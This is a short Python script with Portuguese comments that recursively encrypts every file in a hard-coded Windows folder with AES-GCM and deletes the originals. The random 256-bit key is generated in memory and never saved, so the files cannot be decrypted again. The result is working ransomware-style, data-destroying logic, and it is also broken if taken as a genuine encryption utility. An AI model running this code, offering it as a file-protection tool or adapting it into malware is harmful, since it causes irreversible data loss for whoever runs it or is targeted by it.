import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(key, file_path):
    # Gerar um vetor de inicialização (IV) aleatório
    iv = get_random_bytes(16)
    
    # Criar um objeto de cifra AES em modo GCM
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    
    # Criptografar o conteúdo do arquivo
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    # Escrever o IV, o texto cifrado e a tag no arquivo de saída
    with open(file_path + ".enc", 'wb') as file_encrypted:
        file_encrypted.write(iv + ciphertext + tag)

def encrypt_folder(key, folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(key, file_path)
            os.remove(file_path)  # Remove o arquivo não criptografado

if __name__ == '__main__':
    key = get_random_bytes(32)  # Gere uma chave AES de 256 bits (32 bytes)
    folder_to_encrypt = 'C:\\Users\\logonrmlocal\\Documents\\pasta_test'  # Pasta que você deseja criptografar

    encrypt_folder(key, folder_to_encrypt)
